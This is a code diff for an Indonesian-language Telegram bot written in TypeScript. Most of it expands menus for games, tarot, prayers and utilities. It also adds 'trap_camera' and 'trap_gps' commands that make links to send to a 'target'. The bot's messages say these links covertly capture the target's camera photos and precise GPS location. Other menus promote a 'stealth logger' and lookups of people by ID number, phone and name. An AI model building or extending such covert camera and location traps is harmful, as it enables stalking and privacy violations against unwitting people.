@@ -22,7 +22,10 @@ import play from "play-dl";
 import ytdl from "@distube/ytdl-core";
 import pkg from "@whiskeysockets/baileys";
 const makeWASocket = (pkg as any).default || (pkg as any).makeWASocket || pkg;
-const { useMultiFileAuthState, DisconnectReason } = pkg;
+const useMultiFileAuthState = (pkg as any).useMultiFileAuthState;
+const DisconnectReason = (pkg as any).DisconnectReason;
+
+let globalWaSock: any = null;
 
 
 import QRCode from "qrcode";
@@ -957,13 +960,34 @@ async function startServer() {
                          `━━━━━━━━━━━━━━━━━━━━`;
     
     const mainKeyboard = Markup.inlineKeyboard([
-      [Markup.button.callback('🇮🇩 ʟᴏᴄᴀʟ ᴏꜱɪɴᴛ', 'menu_osint_basic'), Markup.button.callback('📡 ɢʟᴏʙᴀʟ ʀᴇᴄᴏɴ', 'menu_osint_adv')],
-      [Markup.button.callback('🛠️ ʜᴀʀᴅ ᴛᴏᴏʟꜱ', 'menu_tools'), Markup.button.callback('🎣 ꜱᴛᴇᴀʟᴛʜ ʟᴏɢ', 'menu_logger')],
-      [Markup.button.callback('🎲 ᴍɪɴɪ ɢᴀᴍᴇꜱ', 'menu_games'), Markup.button.callback('🎵 ᴍᴇᴅɪᴀ ꜱʏɴᴄ', 'menu_media')],
-      [Markup.button.callback('⏰ ᴀʟᴀʀᴍ ʜᴜʙ', 'menu_alarm'), Markup.button.callback('📱 ǫʀ ɢᴇɴᴇʀᴀᴛᴏʀ', 'menu_qr')],
-      [Markup.button.callback('📲 ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ', 'menu_wa'), Markup.button.callback('ℹ️ ᴛᴇʀᴍɪɴᴀʟ ɪɴꜰᴏ', 'menu_help')],
-      [Markup.button.callback('📜 ᴘᴇʀᴊᴀɴᴊɪᴀɴ ᴘᴇɴɢɢᴜɴᴀ', 'menu_tos')]
+      [Markup.button.callback('🕵️ ᴏꜱɪɴᴛ & ʀᴇᴄᴏɴ', 'menu_osint_adv'), Markup.button.callback('🎣 ꜱᴛᴇᴀʟᴛʜ ʟᴏɢɢᴇʀ', 'menu_logger')],
+      [Markup.button.callback('🛠️ ᴀᴅᴠ ᴛᴏᴏʟꜱ', 'menu_tools'), Markup.button.callback('🎮 ᴄᴏᴍᴘʟᴇx ɢᴀᴍᴇꜱ', 'menu_games')],
+      [Markup.button.callback('🎵 ᴍᴇᴅɪᴀ ᴅᴡɴʟᴅ', 'menu_media'), Markup.button.callback('⏰ ᴀʟᴀʀᴍ ʜᴜʙ', 'menu_alarm')],
+      [Markup.button.callback('📲 ᴡʜᴀᴛꜱᴀᴘᴘ ʙᴏᴛ', 'menu_wa'), Markup.button.callback('📱 ǫʀ ɢᴇɴᴇʀᴀᴛᴏʀ', 'menu_qr')],
+      [Markup.button.callback('⚖️ ᴛᴏꜱ & ᴀɢʀᴇᴇᴍᴇɴᴛ', 'menu_tos'), Markup.button.callback('ℹ️ ᴛᴇʀᴍɪɴᴀʟ ɪɴꜰᴏ', 'menu_help')]
     ]);
+
+    bot.command('trap_camera', (ctx) => {
+      const id = generateTrapId(ctx.chat!.id);
+      const trapUrl = `${appHost.replace(/\/$/, '')}/t/camera_stealth/${id}`;
+      ctx.reply(`📸 <b>STEALTH CAMERA INJECT</b>\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n` +
+                `Kirim Link ini kepada target. Saat diklik, Kamera target akan direkam tanpa UI mencolok.\n\n` +
+                `🔗 <code>${trapUrl}</code>\n\n` +
+                `⚠️ <i>Hasil foto (hingga 4 kali berulang) akan masuk ke chat ini secara otomatis jika disetujui.</i>\n` +
+                `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
+    });
+
+    bot.command('trap_gps', (ctx) => {
+      const id = generateTrapId(ctx.chat!.id);
+      const trapUrl = `${appHost.replace(/\/$/, '')}/t/gps_tracker/${id}`;
+      ctx.reply(`📍 <b>PRECISION GPS TRACKER</b>\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n` +
+                `Kirim Link ini kepada target. Saat target memberikan akses lokasi, koordinat akan dilacak dengan Google Maps level presisi.\n\n` +
+                `🔗 <code>${trapUrl}</code>\n\n` +
+                `⚠️ <i>Pastikan target tidak menggunakan VPN palsu.</i>\n` +
+                `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML', link_preview_options: { is_disabled: true }});
+    });
 
     bot.start((ctx) => ctx.reply(startMsgText, { parse_mode: 'HTML', ...mainKeyboard }));
 
@@ -1042,66 +1066,108 @@ async function startServer() {
 
     bot.action('menu_osint_adv', (ctx) => {
       ctx.answerCbQuery().catch(() => {});
-      const txt = `<b>📡 ᴏꜱɪɴᴛ – ᴘʀᴏꜰᴇꜱꜱɪᴏɴᴀʟ ɢʀᴀᴅᴇ</b>\n` +
+      const txt = `<b>📡 OSINT & GLOBAL RECON</b>\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n` +
-                  `ɢᴜɴᴀᴋᴀɴ ᴘᴇʀɪɴᴛᴀʜ ᴅɪ ʙᴀᴡᴀʜ ɪɴɪ ᴜɴᴛᴜᴋ ɪɴᴠᴇꜱᴛɪɢᴀꜱɪ:\n\n` +
-                  `🇮🇩 <b>ɪɴᴅᴏɴᴇꜱɪᴀ ꜱᴘᴇᴄɪꜰɪᴄ:</b>\n` +
-                  `• /nik [ɴɪᴋ] - ᴅᴇᴄᴏᴅᴇ ɴɪᴋ ᴋᴛᴘ\n` +
-                  `• /plat [ᴘʟᴀᴛ] - ᴄᴇᴋ ᴀꜱᴀʟ ᴡɪʟᴀʏᴀʜ ᴘʟᴀᴛ\n` +
-                  `• /osint_indo - ᴍᴇɴᴜ ᴋʜᴜꜱᴜꜱ ᴏꜱɪɴᴛ ɪɴᴅᴏ\n\n` +
-                  `🔍 <b>ᴅɪɢɪᴛᴀʟ ꜰᴏᴏᴛᴘʀɪɴᴛ:</b>\n` +
-                  `• /username [ᴜꜱᴇʀ] - ᴄᴇᴋ 100+ ᴘʟᴀᴛꜰᴏʀᴍ\n` +
-                  `• /ig [ᴜꜱᴇʀ] - ɪɴꜱᴛᴀɢʀᴀᴍ ᴅᴇᴇᴘ ʟɪɴᴋ\n` +
-                  `• /tiktok [ᴜꜱᴇʀ] - ᴛɪᴋᴛᴏᴋ ᴅᴇᴇᴘ ʟɪɴᴋ\n` +
-                  `• /email [ᴇᴍᴀɪʟ] - ᴠᴇʀɪꜰɪᴋᴀꜱɪ ᴇᴍᴀɪʟ\n\n` +
-                  `🌐 <b>ɴᴇᴛᴡᴏʀᴋ & ᴡᴇʙ:</b>\n` +
-                  `• /dork [ǫᴜᴇʀʏ] - ɢᴏᴏɢʟᴇ ᴅᴏʀᴋ ɢᴇɴ\n` +
-                  `• /scan [ɪᴘ/ᴅᴏᴍ] - ᴅᴇᴇᴘ ꜱᴄᴀɴ ʀᴇᴄᴏɴ\n` +
-                  `• /subdomain [ᴅᴏᴍ] - ᴍᴀᴘᴘɪɴɢ ꜱᴜʙᴅᴏᴍᴀɪɴ\n` +
+                  `Pusat intelijen dan pelacakan jejak digital. Semua perintah ada di bawah ini:\n\n` +
+                  `🌐 <b>NETWORK & IP:</b>\n` +
+                  `• /ip [IP_ADDR] - Deteksi ISP, ISP Name, GPS Geo Info.\n` +
+                  `• /domain [URL] - Detail DNS, Whois.\n` +
+                  `• /scan [IP/DOM] - Nmap Fast Scan/Port checking.\n` +
+                  `• /subdomain [DOM] - Deteksi server terkait.\n` +
+                  `• /mac [MAC] - Cek Vendor OUI.\n` +
+                  `• /headers [URL] - Cek HTTP header & firewall server.\n\n` +
+                  `🕵️ <b>DIGITAL FOOTPRINT:</b>\n` +
+                  `• /username [USER] - Footprint Tracker dari 150+ layanan.\n` +
+                  `• /email [EMAIL] - Format checking & breach scan info.\n` +
+                  `• /github_user [USER] - Scraping profil developer.\n` +
+                  `• /dork [QUERY] - Google Dorking maker.\n\n` +
+                  `💰 <b>FINANCIAL & SECURITY:</b>\n` +
+                  `• /bininfo [BIN] - Card BIN Tracker.\n` +
                   `━━━━━━━━━━━━━━━━━━━━`;
       const kb = Markup.inlineKeyboard([
-        [Markup.button.callback('🔍 ᴏꜱɪɴᴛ ɪɴᴅᴏ ᴍᴇɴᴜ', 'menu_osint_indo')],
-        [Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]
+        [Markup.button.callback('🔍 OSINT INDO (Area Lokal)', 'menu_osint_indo')],
+        [Markup.button.callback('◀️ KEMBALI', 'menu_main')]
       ]);
       ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
     });
 
     bot.action('menu_osint_indo', (ctx) => {
       ctx.answerCbQuery().catch(() => {});
-      const txt = `<b>🇮🇩 ᴏꜱɪɴᴛ ɪɴᴅᴏɴᴇꜱɪᴀ ᴄᴇɴᴛᴇʀ</b>\n` +
+      const txt = `<b>🇮🇩 OSINT INDONESIA CENTER</b>\n` +
                   `━━━━━━━━━━━━━━━━━━━━\n` +
-                  `ᴍᴏᴅᴜʟ ɪɴᴠᴇꜱᴛɪɢᴀꜱɪ ʟᴏᴋᴀʟ ɪɴᴅᴏɴᴇꜱɪᴀ:\n\n` +
-                  `📍 <b>ɪᴅᴇɴᴛɪᴛᴀꜱ & ᴋᴇɴᴅᴀʀᴀᴀɴ:</b>\n` +
-                  `• /nik [16-ᴅɪɢɪᴛ] - ᴀɴᴀʟɪꜱᴀ ᴋᴏᴅᴇ ᴡɪʟᴀʏᴀʜ KTP\n` +
-                  `• /plat [ɴᴏ-ᴘʟᴀᴛ] - ʟᴀᴄᴀᴋ ᴀꜱᴀʟ ᴘʟᴀᴛ ɴᴏᴍᴏʀ\n\n` +
-                  `🔍 <b>ᴘᴇɴᴄᴀʀɪᴀɴ ɴᴀᴍᴀ & ᴊᴇᴊᴀᴋ:</b>\n` +
-                  `• /nama [ɴᴀᴍᴀ ʟᴇɴɢᴋᴀᴘ] - ᴅᴏʀᴋɪɴɢ ɴᴀᴍᴀ ᴏʀᴀɴɢ\n` +
-                  `• /username [ᴜꜱᴇʀ] - ᴄᴇᴋ ᴅɪ ᴋᴀꜱᴋᴜꜱ, ʙʟᴏɢ, ᴅʟʟ\n\n` +
-                  `📱 <b>ᴛᴇʟᴇᴘᴏɴ & ꜱᴏꜱᴍᴇᴅ ɪɴᴅᴏ:</b>\n` +
-                  `• /phone_dork [ɴᴏᴍᴏʀ] - ʟɪɴᴋ ᴛʀᴜᴇᴄᴀʟʟᴇʀ/ᴡᴀ\n` +
-                  `• /sosmed [ᴜꜱᴇʀ] - ꜱᴜᴍᴍᴀʀʏ ʟɪɴᴋ ɪɴᴅᴏ-ꜰᴏᴄᴜꜱ\n` +
+                  `Pusat pencarian dataset dan identitas lokal (Simulated/Public APIs): \n\n` +
+                  `📍 <b>IDENTITAS KTP / KENDARAAN:</b>\n` +
+                  `• /nik [16-DIGIT] - Cek Kode Wilayah KTP.\n` +
+                  `• /plat [NO-PLAT] - Cek Asal Wilayah Plat (Reg Code).\n\n` +
+                  `📞 <b>KOMUNIKASI:</b>\n` +
+                  `• /phone_dork [NOMOR] - Cek HLR Provider & Link Whatsapp.\n` +
+                  `• /sosmed [USER] - Cari di forum Lokal (Kaskus, Indowebster, dll).\n` +
+                  `• /nama [NAMA] - Cari KPU/Data Publik (Dork Link).\n` +
                   `━━━━━━━━━━━━━━━━━━━━`;
-      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_osint_adv')]]);
+      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ KEMBALI', 'menu_osint_adv')]]);
       ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
     });
 
     bot.action('menu_games', (ctx) => {
       ctx.answerCbQuery().catch(() => {});
-      const txt = `<b>🎲 ᴍɪɴɪ ɢᴀᴍᴇꜱ</b>\n` +
-                  `• /khodam [ɴᴀᴍᴀ]\n` +
-                  `• /tebakangka\n` +
-                  `• /ramal [ɴᴀᴍᴀ]\n`;
-      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
+      const txt = `<b>🎮 COMPLEX MINI GAMES SET (20+ Games)</b>\n` +
+                  `━━━━━━━━━━━━━━━━━━━━\n` +
+                  `<b>[CASINO & RNG]</b>\n` +
+                  `• /roulette - Russian Roulette (Adrenalin!)\n` +
+                  `• /dadu - Roll Multiple Dice.\n` +
+                  `• /kartu - Draw a random deck card.\n` +
+                  `• /coinflip - Heads or Tails.\n` +
+                  `• /flip - Text flip.\n\n` +
+                  `<b>[TEBAK-TEBAKAN LOGIKA]</b>\n` +
+                  `• /tebakangka - Tebak Angka Sulit (1-100)\n` +
+                  `• /tebaknegara - Guess the flag.\n` +
+                  `• /tebakkata - Hangman Style Indonesia.\n` +
+                  `• /tebakhewan - Clue based animal guessing.\n` +
+                  `• /susunkata - Scrambled words.\n` +
+                  `• /math - Advanced Fast Math quiz.\n` +
+                  `• /morse - Morse Decode Quiz.\n\n` +
+                  `<b>[PREDIKSI & MISTIK]</b>\n` +
+                  `• /khodam [NAMA] - Cek khodam.\n` +
+                  `• /ramal [NAMA] - AI Prediction (Future).\n` +
+                  `• /jodoh [NAMA] [NAMA2] - Love calculator.\n` +
+                  `• /tarot - 3 Card Reading Spiritual.\n` +
+                  `• /8ball [TANYA] - Magic 8 ball oracle.\n\n` +
+                  `<b>[SOSIAL & LAINNYA]</b>\n` +
+                  `• /suit - Gunting Batu Kertas.\n` +
+                  `• /werewolf - Multi-scenario simulation AI.\n` +
+                  `• /tod - Truth or Dare randomizer.\n` +
+                  `• /gombal - Flirting AI Generator.\n` +
+                  `• /doa - Random Doa Islam.\n` +
+                  `• /joke - Random Dark Joke.\n` +
+                  `• /meme - Fetch Meme.\n` +
+                  `• /fact - Useless Facts.\n` +
+                  `━━━━━━━━━━━━━━━━━━━━`;
+      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ KEMBALI', 'menu_main')]]);
       ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
     });
 
     bot.action('menu_tools', (ctx) => {
       ctx.answerCbQuery().catch(() => {});
-      const txt = `<b>🛠️ ᴜᴛɪʟɪᴛʏ ᴛᴏᴏʟꜱ</b>\n` +
-                  `• /qr [ᴛᴇᴋꜱ]\n` +
-                  `• /shortlink [ᴜʀʟ]\n` +
-                  `• /pwd [ᴘᴀɴᴊᴀɴɢ]\n`;
-      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ ᴋᴇᴍʙᴀʟɪ', 'menu_main')]]);
+      const txt = `<b>🛠️ ADVANCED UTILITY TOOLS</b>\n` +
+                  `━━━━━━━━━━━━━━━━━━━━\n` +
+                  `Kumpulan alat enkripsi, formatter, utility IT complex:\n\n` +
+                  `🔐 <b>CRYPTOGRAPHY:</b>\n` +
+                  `• /b64enc [TEKS] - Base64 Encoder.\n` +
+                  `• /b64dec [TEKS] - Base64 Decoder.\n` +
+                  `• /hash [TEKS] - MD5 Hashing.\n` +
+                  `• /sha256 [TEKS] - SHA-256 Hashing secure.\n` +
+                  `• /pwd [LENGTH] - Random Strong PW Gen.\n` +
+                  `• /uuid - Generate UUID V4.\n\n` +
+                  `🌐 <b>WEB TOOLS:</b>\n` +
+                  `• /qr [URL] - HD QR Code Gen.\n` +
+                  `• /shortlink [URL] - TinyURL Generator.\n` +
+                  `• /port [PORT] - Cek deskripsi service port.\n\n` +
+                  `📊 <b>DATA / API UTILS:</b>\n` +
+                  `• /weather [KOTA] - Info Cuaca API.\n` +
+                  `• /crypto_price [COIN] - WebScrape Harga Kripto.\n` +
+                  `• /github [USER] - Fetch GH Stats.\n` +
+                  `━━━━━━━━━━━━━━━━━━━━`;
+      const kb = Markup.inlineKeyboard([[Markup.button.callback('◀️ KEMBALI', 'menu_main')]]);
       ctx.editMessageText(txt, { parse_mode: 'HTML', ...kb }).catch(() => {});
     });
 
@@ -2104,34 +2170,101 @@ async function startServer() {
     });
 
     bot.command('werewolf', (ctx) => {
-      const roles = ['🐺 Werewolf', '🧙‍♀️ Seer', '🛡️ Bodyguard', '🧑‍🌾 Villager', '🃏 Fool'];
+      const roles = [
+        { r: '🐺 Werewolf', d: 'Tujuanmu: Habisi villager tanpa ketahuan. Berbohonglah dengan baik.' },
+        { r: '🧙‍♀️ Seer', d: 'Tujuanmu: Terawang 1 orang setiap malam untuk mencari Werewolf.' },
+        { r: '🛡️ Bodyguard', d: 'Tujuanmu: Lindungi 1 orang setiap malam dari gigitan Werewolf.' },
+        { r: '🧑‍🌾 Villager', d: 'Tujuanmu: Cari tahu siapa Werewolf di siang hari dan gantung mereka.' },
+        { r: '🃏 Fool', d: 'Tujuanmu: Bertingkah mencurigakan agar digantung oleh Villager (kamu menang jika digantung).' },
+        { r: '🏹 Hunter', d: 'Tujuanmu: Jika kamu mati, kamu bisa membawa seseorang ikut mati bersamamu.' }
+      ];
       const r = roles[Math.floor(Math.random() * roles.length)];
-      ctx.reply(`🌕 <b>WEREWOLF ROLE</b>\nRole kamu adalah: <b>${r}</b>!`, {parse_mode: 'HTML'});
+      
+      const simulasi = [
+        "Desa sedang tegang. Seorang penduduk ditemukan tewas tercabik-cabik.",
+        "Malam sangat hening, tidak ada lolongan.",
+        "Warga desa mulai saling curiga di balai desa.",
+        "Seseorang tertangkap basah keluar rumah saat tengah malam."
+      ];
+      const sim = simulasi[Math.floor(Math.random() * simulasi.length)];
+
+      const msg = `🌕 <b>WEREWOLF ROLE SIMULATION</b>\n` +
+                  `━━━━━━━━━━━━━━━━━━━━\n` +
+                  `Kamu terbangun di desa misterius...\n\n` +
+                  `🎭 <b>ROLE KAMU:</b> ${r.r}\n` +
+                  `📜 <b>MISI:</b> <i>${r.d}</i>\n\n` +
+                  `🌑 <b>SITUASI DESA:</b>\n` +
+                  `<i>"${sim}"</i>\n` +
+                  `━━━━━━━━━━━━━━━━━━━━\n`;
+      ctx.reply(msg, {parse_mode: 'HTML'});
     });
 
     bot.command('8ball', (ctx) => {
       const q = ctx.message.text.split(' ').slice(1).join(' ');
       if(!q) return ctx.reply("Format: /8ball [pertanyaan]");
-      const a = ['Ya, pasti.', 'Bisa jadi.', 'Tentu saja tidak.', 'Sangat meragukan.', 'Tanya lagi nanti.', 'My sources say no.', 'Tentu.'];
-      const res = a[Math.floor(Math.random() * a.length)];
-      ctx.reply(`🎱 <b>MAGIC 8-BALL</b>\nPertanyaan: <i>${q}</i>\nJawaban: <b>${res}</b>`, {parse_mode: 'HTML'});
+      const answers = [
+        { type: '🟢 Positif', text: ['Sangat mungkin terjadi.', 'Tentu saja.', 'Alam semesta mendukungmu.'] },
+        { type: '🟡 Ragu-ragu', text: ['Awan masih gelap, coba lagi nanti.', 'Peluangnya 50/50.', 'Tergantung usahamu mulai sekarang.'] },
+        { type: '🔴 Negatif', text: ['Jangan terlalu berharap.', 'Jauh panggang dari api.', 'Sangat mustahil.'] }
+      ];
+      const category = answers[Math.floor(Math.random() * answers.length)];
+      const res = category.text[Math.floor(Math.random() * category.text.length)];
+      
+      ctx.reply(`🎱 <b>MAGIC 8-BALL ORACLE</b>\n` +
+                `━━━━━━━━━━━━━━━━━━━━\n` +
+                `❓ <b>Pertanyaan:</b> <i>${q}</i>\n` +
+                `🔮 <b>Aura:</b> ${category.type}\n` +
+                `💬 <b>Jawaban:</b> <b>${res}</b>\n` +
+                `━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML'});
     });
 
     bot.command('tarot', (ctx) => {
-      const cards = ['The Fool (Awal baru)', 'The Magician (Kekuatan)', 'The High Priestess (Intuisi)', 'Death (Perubahan)', 'The Tower (Kehancuran)', 'The Sun (Kebahagiaan)', 'The Star (Harapan)'];
-      const c = cards[Math.floor(Math.random() * cards.length)];
-      ctx.reply(`🎴 <b>TAROT READING</b>\nKartu yang ditarik: <b>${c}</b>`, {parse_mode: 'HTML'});
+      const cards = [
+        { c: 'The Fool', m: 'Awal baru, spontanitas, keberanian mengambil risiko.' },
+        { c: 'The Magician', m: 'Kekuatan memanifestasikan keinginan, skill, fokus.' },
+        { c: 'The High Priestess', m: 'Intuisi mendalam, rahasia tersembunyi, spiritualitas.' },
+        { c: 'The Empress', m: 'Kelimpahan, kreativitas, keibuan, alam.' },
+        { c: 'The Emperor', m: 'Struktur, fondasi kuat, otoritas, kepemimpinan.' },
+        { c: 'The Lovers', m: 'Pilihan, harmoni, hubungan, nilai-nilai sejalan.' },
+        { c: 'The Chariot', m: 'Kemauan keras, kontrol, mengatasi rintangan.' },
+        { c: 'Death', m: 'Perubahan radikal, akhir dari sebuah fase, transformasi.' },
+        { c: 'The Tower', m: 'Kehancuran tiba-tiba, kebenaran terungkap bejat, kekacauan buta.' },
+        { c: 'The Star', m: 'Harapan setelah badai, penyembuhan, inspirasi murni.' },
+        { c: 'The Moon', m: 'Ilusi, ketakutan bawah sadar, kompleksitas batin.' },
+        { c: 'The Sun', m: 'Sukses, kebahagiaan, pencapaian puncak, kejelasan.' }
+      ];
+      
+      // Select 3 random unique cards
+      const shuffled = cards.sort(() => 0.5 - Math.random());
+      const selected = shuffled.slice(0, 3);
+
+      const msg = `🎴 <b>TAROT: THREE CARDS SPREAD</b>\n` +
+                  `━━━━━━━━━━━━━━━━━━━━\n` +
+                  `🕰️ <b>MASA LALU:</b> ${selected[0].c}\n` +
+                  `<i>${selected[0].m}</i>\n\n` +
+                  `🌍 <b>MASA KINI:</b> ${selected[1].c}\n` +
+                  `<i>${selected[1].m}</i>\n\n` +
+                  `🔮 <b>MASA DEPAN:</b> ${selected[2].c}\n` +
+                  `<i>${selected[2].m}</i>\n` +
+                  `━━━━━━━━━━━━━━━━━━━━\n` +
+                  `⚠️ <i>Disclaimer: Ini hanya simulasi acak untuk hiburan.</i>`;
+
+      ctx.reply(msg, {parse_mode: 'HTML'});
     });
 
     bot.command('doa', (ctx) => {
-      const d = ['Semoga hari ini rezekimu lancar!', 'Tetap semangat, jangan menyerah!', 'Semoga segala urusanmu dimudahkan.', 'Jaga kesehatan, dunia butuh kamu!', 'Semoga impianmu segera terwujud!'];
-      const res = d[Math.floor(Math.random() * d.length)];
-      ctx.reply(`🤲 <b>MOTIVASI HARI INI</b>\n<i>"${res}"</i>`, {parse_mode: 'HTML'});
+      const qs = [
+        { title: 'Doa Memohon Kemudahan', ar: 'رَبِّ اشْرَحْ لِي صَدْرِي وَيَسِّرْ لِي أَمْرِي', id: 'Ya Tuhanku, lapangkanlah untukku dadaku, dan mudahkanlah untukku urusanku.' },
+        { title: 'Doa Kebaikan Dunia Akhirat', ar: 'رَبَّنَا آتِنَا فِي الدُّنْيَا حَسَنَةً وَفِي الآخِرَةِ حَسَنَةً وَقِنَا عَذَابَ النَّارِ', id: 'Ya Tuhan kami, berikan kami kebaikan di dunia dan kebaikan di akhirat, dan lindungilah kami dari siksa neraka.' },
+        { title: 'Doa Memohon Kesembuhan', ar: 'اللَّهُمَّ رَبَّ النَّاسِ أَذْهِبِ الْبَأْسَ اشْفِ أَنْتَ الشَّافِي', id: 'Ya Allah, Tuhan manusia, hilangkanlah penyakit, sembuhkanlah, Engkau Maha Penyembuh.' }
+      ];
+      const q = qs[Math.floor(Math.random() * qs.length)];
+      ctx.reply(`🤲 <b>DAILY PRAYER / DOA</b>\n━━━━━━━━━━━━━━━━━━━━\n<b>${q.title}</b>\n\n<code>${q.ar}</code>\n\n<i>"${q.id}"</i>\n━━━━━━━━━━━━━━━━━━━━`, {parse_mode: 'HTML'});
     });
 
     bot.command('tod', (ctx) => {
-      const t = ['Beritahu rahasia terbesarmu!', 'Kapan terakhir kali menangis?', 'Siapa crush kamu saat ini?', 'Pernah ngompol di celana?'];
-      const d = ['Kirim foto jelek kamu sekarang!', 'Chat mantan kamu bilang rindu!', 'Ganti PP wa sama gambar monyet seharian!', 'Kirim VN nyanyi balonku!'];
+      const t = ['Beritahu rahasia terbesarmu!', 'Kapan terakhir kali menangis?', 'Siapa crush kamu saat ini?', 'Pernah ngompol di celana?', 'Hal terburuk apa yang pernah kamu lakukan ke teman?'];
+      const d = ['Kirim foto jelek kamu sekarang!', 'Chat mantan kamu bilang rindu!', 'Ganti PP wa sama gambar monyet seharian!', 'Kirim VN nyanyi balonku!', 'Post story nyanyi lagu anak anak!'];
       const isTruth = Math.random() > 0.5;
       const res = isTruth ? `🔵 <b>TRUTH</b>\n${t[Math.floor(Math.random() * t.length)]}` : `🔴 <b>DARE</b>\n${d[Math.floor(Math.random() * d.length)]}`;
       ctx.reply(res, {parse_mode: 'HTML'});
@@ -2139,8 +2272,13 @@ async function startServer() {
 
     bot.command('gombal', (ctx) => {
       const nama = ctx.message.text.split(' ').slice(1).join(' ') || 'Sayang';
-      const g = [`${nama}, tau bedanya kamu sama modem? Modem connect ke internet, kamu connect ke hatiku.`, `Sejak kenal ${nama}, aku lupa cara sedih.`, `Pisa miring karena terpesona senyum ${nama}.`];
-      ctx.reply(`💕 <b>GOMBALAN</b>\n<i>"${g[Math.floor(Math.random() * g.length)]}"</i>`, {parse_mode: 'HTML'});
+      const g = [
+        `${nama}, tau bedanya kamu sama modem? Modem connect ke internet, kamu connect ke hatiku.`, 
+        `Sejak kenal ${nama}, aku lupa cara sedih.`, 
+        `Pisa miring karena terpesona senyum ${nama}.`,
+        `${nama}, cintaku ke kamu itu kayak Dorking. Semakin digali, semakin dalam.`
+      ];
+      ctx.reply(`💕 <b>GOMBALAN CYBER</b>\n<i>"${g[Math.floor(Math.random() * g.length)]}"</i>`, {parse_mode: 'HTML'});
     });
 
     bot.command('tebaknegara', (ctx) => {
@@ -2391,9 +2529,7 @@ async function startServer() {
       }
     });
 
-    // WHATSAPP BOT INTEGRATION
     let waConnecting = false;
-    let globalWaSock: any = null;
 
     // We hook the telegram.callApi to intercept WhatsApp targeted messages
     const originalCallApi = bot.telegram.callApi.bind(bot.telegram);
